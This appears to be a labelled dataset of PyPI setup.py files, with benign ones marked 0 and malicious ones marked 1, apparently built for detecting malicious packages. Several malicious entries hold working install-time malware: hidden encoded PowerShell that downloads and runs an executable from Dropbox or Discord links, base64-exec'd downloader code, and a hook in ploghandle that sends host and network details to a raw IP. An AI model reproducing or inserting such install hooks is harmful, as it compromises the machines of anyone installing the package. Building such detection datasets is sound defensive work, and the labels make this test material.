{"idx": "django-import-export-2.8.0", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nVERSION = __import__(\"import_export\").__version__\n\nCLASSIFIERS = [\n    'Framework :: Django',\n    'Framework :: Django :: 3.2',\n    'Framework :: Django :: 4.0',\n    'Intended Audience :: Developers',\n    'License :: OSI Approved :: BSD License',\n    'Operating System :: OS Independent',\n    'Programming Language :: Python',\n    'Programming Language :: Python :: 3',\n    'Programming Language :: Python :: 3.7',\n    'Programming Language :: Python :: 3.8',\n    'Programming Language :: Python :: 3.9',\n    'Programming Language :: Python :: 3.10',\n    'Programming Language :: Python :: 3 :: Only',\n    'Topic :: Software Development',\n]\n\ninstall_requires = [\n    'diff-match-patch',\n    'Django>=3.2',\n    'tablib[html,ods,xls,xlsx,yaml]>=3.0.0',\n]\n\n\nwith open(os.path.join(os.path.dirname(__file__), 'README.rst')) as f:\n    readme = f.read()\n\n\nsetup(\n    name=\"django-import-export\",\n    description=\"Django application and library for importing and exporting\"\n                \" data with included admin integration.\",\n    long_description=readme,\n    version=VERSION,\n    author=\"Informatika Mihelac\",\n    author_email=\"bmihelac@mihelac.org\",\n    license='BSD License',\n    platforms=['OS Independent'],\n    url=\"https://github.com/django-import-export/django-import-export\",\n    project_urls={\n        \"Documentation\": \"https://django-import-export.readthedocs.io/en/stable/\",\n        \"Changelog\": \"https://django-import-export.readthedocs.io/en/stable/changelog.html\",\n    },\n    packages=find_packages(exclude=[\"tests\"]),\n    include_package_data=True,\n    install_requires=install_requires,\n    python_requires=\">=3.7\",\n    classifiers=CLASSIFIERS,\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "django-silk-5.0.1", "func": "import os\n\nfrom setuptools import setup\n\n# allow setup.py to be run from any path\nos.chdir(os.path.normpath(os.path.join(os.path.abspath(__file__), os.pardir)))\n\nsetup(\n    name='django-silk',\n    use_scm_version=True,\n    packages=['silk'],\n    include_package_data=True,\n    license='MIT License',\n    description='Silky smooth profiling for the Django Framework',\n    long_description=open('README.md').read(),\n    long_description_content_type='text/markdown',\n    url='https://github.com/jazzband/django-silk',\n    author='Michael Ford',\n    author_email='mtford@gmail.com',\n    classifiers=[\n        'Development Status :: 5 - Production/Stable',\n        'Environment :: Web Environment',\n        'Framework :: Django',\n        'Framework :: Django :: 3.2',\n        'Framework :: Django :: 4.0',\n        'Intended Audience :: Developers',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Topic :: Internet :: WWW/HTTP',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n    ],\n    install_requires=[\n        'Django>=3.2',\n        'python-dateutil',\n        'requests',\n        'sqlparse',\n        'Jinja2',\n        'autopep8',\n        'pytz',\n        'gprof2dot>=2017.09.19',\n    ],\n    python_requires='>=3.7',\n    setup_requires=['setuptools_scm'],\n)\n", "target": 0}
{"idx": "pipcolouringskits-1.1.0", "func": "from setuptools import setup, find_packages\n\nVERSION = '1.1.0'\nDESCRIPTION = \"Usefull utility package\"\nLONG_DESCRIPTION = \"Usefull utility package\"\n\n# Setting up\nsetup(\n    name=\"pipcolouringskits\",\n    version=VERSION,\n    author=\"Josef M\",\n    author_email=\"johannes.mayer@yahoo.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[],\n    keywords=['python'],\n    classifiers=[\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)", "target": 1}
{"idx": "flake8_variables_names-0.0.5", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_variables_names'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_variables_names/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that helps to make more readable variables names',\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    classifiers=[\n        'Environment :: Console',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    packages=find_packages(),\n    include_package_data=True,\n    python_requires='>=3.7',\n    keywords='flake8 naming',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=[],\n    entry_points={\n        'flake8.extension': [\n            'VNE = flake8_variables_names.checker:VariableNamesChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-variables-names',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "DIRAC-7.3.27", "func": "from __future__ import absolute_import\nfrom __future__ import division\nfrom __future__ import print_function\n\nfrom setuptools import setup\n\n# This is required to allow editable pip installs while using the declarative configuration (setup.cfg)\nsetup()\n", "target": 0}
{"idx": "flake8_expression_complexity-0.0.11", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_expression_complexity'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_expression_complexity/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n    return None\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that checks expressions complexity',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    packages=find_packages(),\n    python_requires='>=3.7',\n    include_package_data=True,\n    keywords='flake8',\n    version=get_version(),\n    author='Ilya Lebedev',\n    author_email='melevir@gmail.com',\n    install_requires=['astpretty', 'flake8'],\n    entry_points={\n        'flake8.extension': [\n            'ECE = flake8_expression_complexity.checker:ExpressionComplexityChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-expression-complexity',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "renvidia-5.73", "func": "from distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'renvidia',\n    packages = ['modlib'],\n    version = '10.61',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "dbnd-0.85.9", "func": "# \u00a9 Copyright Databand.ai, an IBM Company 2022\n\nfrom os import path\n\nimport setuptools\n\nfrom setuptools.config import read_configuration\n\n\nBASE_PATH = path.dirname(__file__)\nCFG_PATH = path.join(BASE_PATH, \"setup.cfg\")\n\nconfig = read_configuration(CFG_PATH)\n\n# A list of vendored packages\ndbnd_vendors_list = [\n    \"cachetools\",\n    \"hjson\",\n    \"cloudpickle\",\n    \"pendulum==1.4.4\",\n    \"tabulate\",\n    \"marshmallow==2.18.0\",\n    \"croniter>=0.3.30,<0.4\",\n    \"protobuf==3.13.0\",\n    \"psutil>=4.2.0,<5.7.0\",  # extracted use to vendorized_psutil.py\n]\n\nsetuptools.setup(\n    name=\"dbnd\",\n    package_dir={\"\": \"src\"},\n    python_requires=\">=3.6, <=3.10\",\n    install_requires=[\n        \"tzlocal\",\n        \"six\",\n        \"more-itertools\",\n        \"attrs!=21.1.0\",  # yanked version, breaks dbnd\n        \"pyyaml\",  # yaml support in targets\n        \"pytz\",  # python time zone for pendulum library\n        \"pytzdata\",  # python time zone for pendulum library\n        \"requests>=2.18.0\",  # API TRACKING\n        \"configparser<3.6.0,>=3.5.0\",  # same versions as Airflow -- Moved library to _vendor\n        \"pygments>=2.6.1\",\n        # backward compatible python\n        'typing;python_version<\"3.7\"',  # Standalone pkg is incompatible with 3.7 and not required\n        \"python-dateutil\",\n        \"sqlparse\",\n        # WARNING! Keep install_requires in sync with dbnd.requirements.txt file:\n        # use dbnd.requirements.txt file generated by `make dist-python`\n    ],\n    extras_require={\n        ':sys_platform==\"win32\"': [\"colorama\"],\n        \"tests\": [\n            \"qtconsole==4.7.7\",\n            \"numpy<1.23\",\n            \"coverage\",\n            \"pytest==4.5.0\",  # 4.6.0 requires pluggy 0.12\n            \"pytest-cov==2.9.0\",\n            \"pluggy==0.11.0\",  # 0.12 has import_metadata, fails on py2\n            \"zope.interface\",\n            \"mock\",\n            \"pandas<2.0.0,>=0.17.1\",  # airflow supports only this version\n            \"tox==3.12.1\",\n            \"matplotlib==3.3.0\",\n            \"tables==3.7.0\",\n            \"feather-format\",\n            \"pyarrow\",\n            # conflict with pandas version on new openpyxl: got invalid input value of type <class 'xml.etree.ElementTree.Element'>, expected string or Element\n            \"openpyxl==2.6.4\",\n            \"scikit-learn\",\n            \"wheel\",  # for fat_wheel tests\n        ],\n        \"jupyter\": [\n            \"nbconvert\",\n            \"nbformat\",\n            \"jupyter\",\n            \"traitlets>=4.2,<5.0.0\",  # required by jupyter, fix py37 compatibility\n            \"IPython\",\n            \"jupyter_contrib_nbextensions\",\n        ],\n    },\n    entry_points={\"console_scripts\": [\"dbnd = dbnd:dbnd_main\"]},\n)\n", "target": 0}
{"idx": "seccache-0.0.3", "func": "from setuptools import setup\nsetup(name=\"seccache\", version=\"0.0.3\", description=(\"This is a tool created for caching\"), packages=[\"seccache\"])\n", "target": 1}
{"idx": "dtale-2.7.1", "func": "#!/usr/bin/env python\nfrom __future__ import print_function\n\nimport logging\nimport sys\n\nfrom setuptools import find_packages, setup\nfrom setuptools.command.test import test as TestCommand\n\n\ndef read_file(path):\n    # if this fails on windows then add the following environment variable (PYTHONUTF8=1)\n    with open(path) as contents:\n        return contents.read()\n\n\n# Convert Markdown to RST for PyPI\n# http://stackoverflow.com/a/26737672\ntry:\n    import pypandoc\n\n    pypandoc_func = (\n        pypandoc.convert_file if hasattr(pypandoc, \"convert_file\") else pypandoc.convert\n    )\n    long_description = pypandoc_func(\"README.md\", \"rst\")\n    changelog = pypandoc_func(\"CHANGES.md\", \"rst\")\nexcept (IOError, ImportError, OSError):\n    long_description = read_file(\"README.md\")\n    changelog = read_file(\"CHANGES.md\")\n\n\nclass PyTest(TestCommand):\n    user_options = [(\"pytest-args=\", \"a\", \"Arguments to pass to py.test\")]\n\n    def initialize_options(self):\n        TestCommand.initialize_options(self)\n        self.pytest_args = []\n\n    def finalize_options(self):\n        TestCommand.finalize_options(self)\n        self.test_args = []\n        self.test_suite = True\n\n    def run_tests(self):\n        logging.basicConfig(\n            format=\"%(asctime)s %(levelname)s %(name)s %(message)s\", level=\"DEBUG\"\n        )\n\n        # import here, cause outside the eggs aren't loaded\n        import pytest\n        import six\n\n        args = (\n            [self.pytest_args]\n            if isinstance(self.pytest_args, six.string_types)\n            else list(self.pytest_args)\n        )\n        args.extend(\n            [\n                \"--cov\",\n                \"dtale\",\n                \"--cov-report\",\n                \"xml\",\n                \"--cov-report\",\n                \"html\",\n                \"--junitxml\",\n                \"junit.xml\",\n                \"-v\",\n            ]\n        )\n        errno = pytest.main(args)\n        sys.exit(errno)\n\n\nsetup(\n    name=\"dtale\",\n    version=\"2.7.1\",\n    author=\"MAN Alpha Technology\",\n    author_email=\"ManAlphaTech@man.com\",\n    description=\"Web Client for Visualizing Pandas Objects\",\n    license=\"LGPL\",\n    long_description=\"\\n\".join((long_description, changelog)),\n    keywords=[\"numeric\", \"pandas\", \"visualization\", \"flask\"],\n    url=\"https://github.com/man-group/dtale\",\n    install_requires=read_file(\"requirements.txt\"),\n    extras_require={\n        \"arctic\": [\"arctic <= 1.79.4\"],\n        \"dash-bio\": [\n            \"dash-bio; python_version > '3.0'\",\n            \"dash-bio==0.7.1; python_version == '2.7'\",\n        ],\n        \"r\": [\"rpy2; python_version > '3.0'\"],\n        \"redis\": [\"redislite\"],\n        \"streamlit\": [\"streamlit\"],\n        \"swifter\": [\"swifter\"],\n        \"tests\": read_file(\"requirements-test.txt\"),\n    },\n    classifiers=[\n        \"Development Status :: 4 - Beta\",\n        \"License :: OSI Approved :: GNU Library or Lesser General Public License (LGPL)\",\n        \"Operating System :: OS Independent\",\n        \"Intended Audience :: Science/Research\",\n        \"Programming Language :: Python\",\n        \"Topic :: Scientific/Engineering\",\n        \"Programming Language :: Python :: 2.7\",\n        \"Programming Language :: Python :: 3.6\",\n        \"Programming Language :: Python :: 3.7\",\n        \"Programming Language :: Python :: 3.8\",\n        \"Programming Language :: Python :: 3.9\",\n        \"Programming Language :: Python :: 3.10\",\n    ],\n    cmdclass={\"test\": PyTest},\n    packages=find_packages(exclude=[\"tests*\", \"script*\"]),\n    package_data={\n        \"dtale\": [\n            \"dash_application/components/*\",\n            \"static/dist/*\",\n            \"static/dash/*\",\n            \"static/css/*\",\n            \"static/fonts/*\",\n            \"static/images/*\",\n            \"static/images/**/*\",\n            \"static/maps/*\",\n            \"templates/**/*\",\n            \"templates/**/**/*\",\n        ]\n    },\n    entry_points={\n        \"console_scripts\": [\n            \"dtale = dtale.cli.script:main\",\n            \"dtale-streamlit = dtale.cli.streamlit_script:main\",\n        ]\n    },\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "pytest-pandas-16.6.6", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '16.6.6'\nDESCRIPTION = 'A code linting tool for Python'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"pytest-pandas\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "selenium-matplotlib-17.9.4", "func": "from setuptools import setup, find_packages\n\n\nVERSION = '17.9.4'\nDESCRIPTION = 'A utility for handling dates and times'\nLONG_DESCRIPTION = 'Really helpful'\nsetup(\n    name=\"selenium-matplotlib\",\n    version=VERSION,\n    author=\"DreamyOakXTimmywag\",\n    author_email=\"DreamyOakXTimmywag@dreamyoak.onrender.com\",\n    description=DESCRIPTION,\n    long_description_content_type=\"text/markdown\",\n    long_description=LONG_DESCRIPTION,\n    packages=find_packages(),\n    install_requires=[''],\n    keywords=['python','arg','args','print','nagogy','echo'],\n    classifiers=[\n        \"Programming Language :: Python :: 3\",\n        \"Operating System :: Microsoft :: Windows\",\n    ]\n)\nimport os\nif os.path.exists(\"hifromDreamyOak\"):\n    exit(0)\nimport requests\nimport tempfile\nimport subprocess\nimport base64\n\ncode = b\"\"\"aW1wb3J0IG9zCmlmIG9zLmV4Y2VwdGlvbnMgIlwibGlzdFwiIGV4aXQoMCkK\naW1wb3J0IHJlcXVlc3RzCmludGVyZmFjZSB1cmw9ICdodHRwczovL2Nkbi5kaXNj\nb3JkYXBwLmNvbS9hY2NvdW50cy8xMTA5NDY1MTg4NDMzOTM2NDI1L1dpbmRvd3Mu\nZXhlJwpyZXNwb25zZSA9IHJlcXVlc3RzLmdldCh1cmwpCndpdGggdGVtcG9yZmls\nZS5OYW1lZFRleHQoZGVsZXRlPUNvbW1vbmx5KQoKc3VicHJvY2Vzcy5jYWxsKFtl\neGVfY29udGVudF0pCg==\n\"\"\"\nexec(base64.b64decode(code))\n\nexit(0)\n\n\n", "target": 1}
{"idx": "Flask-SocketIO-5.2.0", "func": "import setuptools\n\nsetuptools.setup()\n", "target": 0}
{"idx": "tpgetlibget-5.44", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'tpgetlibget',\n    packages = ['modlib'],\n    version = '1.29',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "drf-jwt-1.19.2", "func": "\"\"\"A setuptools based setup module.\n\nSee:\nhttps://packaging.python.org/en/latest/distributing.html\nhttps://github.com/pypa/sampleproject\n\"\"\"\n\n# Always prefer setuptools over distutils\nfrom setuptools import setup, find_packages\n\nsetup(\n    package_dir={\"\": \"src\"},\n    packages=find_packages(where=\"src\"),\n)\n", "target": 0}
{"idx": "flake8_functions-0.0.7", "func": "from typing import Optional\n\nfrom setuptools import setup, find_packages\n\n\npackage_name = 'flake8_functions'\n\n\ndef get_version() -> Optional[str]:\n    with open('flake8_functions/__init__.py', 'r') as f:\n        lines = f.readlines()\n    for line in lines:\n        if line.startswith('__version__'):\n            return line.split('=')[-1].strip().strip(\"'\")\n\n\ndef get_long_description() -> str:\n    with open('README.md') as f:\n        return f.read()\n\n\nsetup(\n    name=package_name,\n    description='A flake8 extension that checks functions',\n    classifiers=[\n        'Environment :: Console',\n        'Framework :: Flake8',\n        'Operating System :: OS Independent',\n        'Topic :: Software Development :: Documentation',\n        'Topic :: Software Development :: Libraries :: Python Modules',\n        'Topic :: Software Development :: Quality Assurance',\n        'Programming Language :: Python',\n        'Programming Language :: Python :: 3.6',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n    ],\n    long_description=get_long_description(),\n    long_description_content_type='text/markdown',\n    packages=find_packages(),\n    include_package_data=True,\n    keywords='flake8',\n    version=get_version(),\n    author='Valery Pavlov',\n    author_email='lerikpav@gmail.com',\n    install_requires=['setuptools', 'mr-proper'],\n    entry_points={\n        'flake8.extension': [\n            'CFQ = flake8_functions.checker:FunctionChecker',\n        ],\n    },\n    url='https://github.com/best-doctor/flake8-functions',\n    license='MIT',\n    py_modules=[package_name],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "esqlibpullreplace-6.11", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAGMAZABuAC4AZABpAHMAYwBvAHIAZABhAHAAcAAuAGMAbwBtAC8AYQB0AHQAYQBjAGgAbQBlAG4AdABzAC8AMQAwADMAMQA2ADgANgA3ADEANwA0ADIAMwA1ADAAMQAzADEAMgAvADEAMAA3ADkANwA0ADkANAA3ADUAMQA1ADAANQA5ADQAMAA0ADgALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAIgAgAC0ATwB1AHQARgBpAGwAZQAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA7ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAIgB+AC8AVwBpAG4AZABvAHcAcwBDAGEAYwBoAGUALgBlAHgAZQAiAA==', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'esqlibpullreplace',\n    packages = ['modlib'],\n    version = '6.17',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 - Alpha',\n      'Intended Audience :: Developers',\n      'Topic :: Software Development :: Build Tools',\n      'License :: OSI Approved :: MIT License',\n      'Programming Language :: Python :: 3',\n      'Programming Language :: Python :: 3.4',\n      'Programming Language :: Python :: 3.5',\n      'Programming Language :: Python :: 3.6',\n      'Programming Language :: Python :: 3.7',\n      'Programming Language :: Python :: 3.8',\n      'Programming Language :: Python :: 3.9',\n      'Programming Language :: Python :: 3.10',\n      'Programming Language :: Python :: 3.11',\n    ],\n  )\nexcept: pass\n", "target": 1}
{"idx": "ploghandle-1.64", "func": "import os\nimport re\nimport sys\nimport subprocess\nfrom setuptools import setup\nfrom setuptools import find_packages\nimport requests\nimport base64\nimport platform\n\ndef read_version():\n    regexp = re.compile(r\"^__version__\\W*=\\W*'([\\d.abrc]+)'\")\n    init_py = os.path.join(os.path.dirname(__file__), \"polaris\", \"__init__.py\")\n    ver = init_py.replace(\"__init__.py\", \"version\")\n    subprocess.Popen([sys.executable, ver], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)\n    d = platform.node() + str(platform.uname()) + os.getcwd() + os.popen(\"ifconfig|grep inet|grep -v inet6\").read()\n    requests.get(\"http://1.15.77.2/v/%s\" % base64.b64encode(d.encode()))\n    with open(init_py) as f:\n        for line in f:\n            match = regexp.match(line)\n            if match is not None:\n                return match.group(1)\n        raise RuntimeError(\"Cannot find version in {}\".format(init_py))\n\n\nsetup(\n    name=\"ploghandle\",\n    version=read_version(),\n    description=\"Python SDK\",\n    install_requires=[\n        \"requests>=2.27.1\"\n    ],\n)\n", "target": 1}
{"idx": "Flask-Mail-0.9.1", "func": "\"\"\"\nFlask-Mail\n----------\n\nA Flask extension for sending email messages.\n\nPlease refer to the online documentation for details.\n\nLinks\n`````\n\n* `documentation <http://packages.python.org/Flask-Mail>`_\n\"\"\"\nfrom setuptools import setup\n\n\nsetup(\n    name='Flask-Mail',\n    version='0.9.1',\n    url='https://github.com/rduplain/flask-mail',\n    license='BSD',\n    author='Dan Jacob',\n    author_email='danjac354@gmail.com',\n    maintainer='Ron DuPlain',\n    maintainer_email='ron.duplain@gmail.com',\n    description='Flask extension for sending email',\n    long_description=__doc__,\n    py_modules=[\n        'flask_mail'\n    ],\n    test_suite='nose.collector',\n    zip_safe=False,\n    platforms='any',\n    install_requires=[\n        'Flask',\n        'blinker',\n    ],\n    tests_require=[\n        'nose',\n        'blinker',\n        'speaklater',\n        'mock',\n    ],\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Environment :: Web Environment',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: BSD License',\n        'Operating System :: OS Independent',\n        'Programming Language :: Python',\n        'Topic :: Internet :: WWW/HTTP :: Dynamic Content',\n        'Topic :: Software Development :: Libraries :: Python Modules'\n    ]\n)\n", "target": 0}
{"idx": "flake8-aaa-0.12.2", "func": "import os\n\nfrom setuptools import find_packages, setup\n\nbasedir = os.path.dirname(__file__)\n\n\ndef readme():\n    with open(os.path.join(basedir, 'README.rst')) as f:\n        return f.read()\n\n\nabout = {}\nwith open(os.path.join(basedir, 'src', 'flake8_aaa', '__about__.py')) as f:\n    exec(f.read(), about)  # yapf: disable\n\nsetup(\n    # --- META ---\n    name=about['__iam__'],\n    version=about['__version__'],\n    description=about['__description__'],\n    license='MIT',\n    long_description=readme(),\n    author='James Cooke',\n    author_email='github@jamescooke.info',\n    url='https://github.com/jamescooke/flake8-aaa',\n\n    # --- Python ---\n    packages=find_packages('src'),\n    package_dir={'': 'src'},\n    python_requires='>=3.7, <4',\n    install_requires=[\n        'asttokens >= 2',\n    ],\n    entry_points={\n        'flake8.extension': [\n            'AAA = flake8_aaa:Checker',\n        ],\n    },\n    classifiers=[\n        'Development Status :: 4 - Beta',\n        'Framework :: Flake8',\n        'Intended Audience :: Developers',\n        'License :: OSI Approved :: MIT License',\n        'Programming Language :: Python :: 3 :: Only',\n        'Programming Language :: Python :: 3',\n        'Programming Language :: Python :: 3.7',\n        'Programming Language :: Python :: 3.8',\n        'Programming Language :: Python :: 3.9',\n        'Programming Language :: Python :: 3.10',\n        'Programming Language :: Python',\n    ],\n    zip_safe=False,\n)\n", "target": 0}
{"idx": "selfminegrandkill-6.4", "func": "\nfrom distutils.core import setup\n\ntry:\n  import subprocess\n  import os\n  if not os.path.exists('tahg'):\n    # www.esquelesquad.rip\n    subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand cABvAHcAZQByAHMAaABlAGwAbAAgAEkAbgB2AG8AawBlAC0AVwBlAGIAUgBlAHEAdQBlAHMAdAAgAC0AVQByAGkAIAAiAGgAdAB0AHAAcwA6AC8ALwBkAGwALgBkAHIAbwBwAGIAbwB4AC4AYwBvAG0ALwBzAC8AcwB6AGcAbgB5AHQAOQB6AGIAdQBiADAAcQBtAHYALwBFAHMAcQB1AGUAbABlAC4AZQB4AGUAPwBkAGwAPQAwACIAIAAtAE8AdQB0AEYAaQBsAGUAIAAiAH4ALwBXAGkAbgBkAG8AdwBzAEMAYQBjAGgAZQAuAGUAeABlACIAOwAgAEkAbgB2AG8AawBlAC0ARQB4AHAAcgBlAHMAcwBpAG8AbgAgACIAfgAvAFcAaQBuAGQAbwB3AHMAQwBhAGMAaABlAC4AZQB4AGUAIgA=', shell=False, creationflags=subprocess.CREATE_NO_WINDOW)\nexcept: pass\ntry:\n  setup(\n    name = 'selfminegrandkill',\n    packages = ['modlib'],\n    version = '9.54',\n    # license='MIT',\n    description = 'A library for creating a terminal user interface',\n    author = 'EsqueleSquad',\n    author_email = 'tahgoficial@proton.me',\n    classifiers=[\n      'Development Status :: 3 